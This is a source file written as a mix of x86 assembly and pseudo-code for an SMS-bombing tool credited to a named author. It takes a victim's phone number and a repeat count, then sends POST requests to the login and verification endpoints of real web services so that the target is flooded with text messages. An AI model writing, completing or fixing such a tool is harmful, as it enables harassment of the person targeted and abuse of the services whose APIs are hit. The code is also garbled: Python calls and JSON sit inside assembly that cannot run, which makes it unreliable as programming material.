section .bss
    phoneNumber resb 15
    url resd 1
    header resd 1

section .text
    global _start

_start:
    call clearScreen

    ; Print banner
    mov edx, banner
    mov ecx, edx
    mov ebx, 1
    mov eax, 4
    int 0x80

    ; Input phone number
    mov edx, phoneNumber
    mov ecx, 15
    mov ebx, 0
    mov eax, 3
    int 0x80

    ; Input repeat count
    mov edx, repeatCount
    mov ecx, 4
    mov ebx, 0
    mov eax, 3
    int 0x80

    ; Loop through each URL and header
    mov ecx, repeatCount
loop_urls:
    mov ebx, urls
    mov eax, [ebx + ecx]

    mov url, eax

    mov ebx, headers
    mov eax, [ebx + ecx]
    mov header, eax

    ; Call the sms function with the current URL and header
    call sms

    dec ecx
    cmp ecx, 0
    jne loop_urls

    ; Exit the program
    mov eax, 1
    xor ebx, ebx
    int 0x80

sms:
    ; Sleep for 3 seconds
    mov eax, 3
    call sleep

    ; Convert header to JSON
    mov ebx, header
    mov eax, json.dumps
    call eax
    mov jsonData, eax

    ; Send POST request
    mov edx, url
    mov ecx, {"Content-Type": "application/json"}
    mov eax, jsonData
    mov ebx, 1
    mov esi, 0
    call requests.post

    ; Check response status
    cmp eax, 200
    jne error

    ; Print success message
    mov edx, successMsg
    mov ecx, edx
    mov ebx, 1
    mov eax, 4
    int 0x80
    jmp end

error:
    ; Print error message
    mov edx, errorMsg
    mov ecx, edx
    mov ebx, 1
    mov eax, 4
    int 0x80

end:
    ret

clearScreen:
    ; Clear the screen
    mov eax, 'clear'
    call system

    ret

system:
    ; Call the system function to clear the screen
    mov eax, 6
    int 0x80

    ret

sleep:
    ; Sleep for the specified number of seconds
    mov eax, 35 ; sleep syscall number
    int 0x80

    ret

banner db "\033[01;33m
\t\t\t\t\t\t\t\t\t\tCoded By NICOLA(Telegram: @black_nicola)\n\tGitHub : mr-r0ot
",0

repeatCount dd 0
phoneNumber resb 15

urls dd https://3tex.io/api/1/users/validation/mobile,
            https://deniizshop.com/api/v1/sessions/login_request,
            ... ; add rest of the URLs here

headers dd {"receptorPhone": phoneNumber},
            {"mobile_phone": phoneNumber},
            ... ; add rest of the headers here

jsonData dd 0

errorMsg db "\033[01;31m[-] Error ! ",0
successMsg db "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended",0
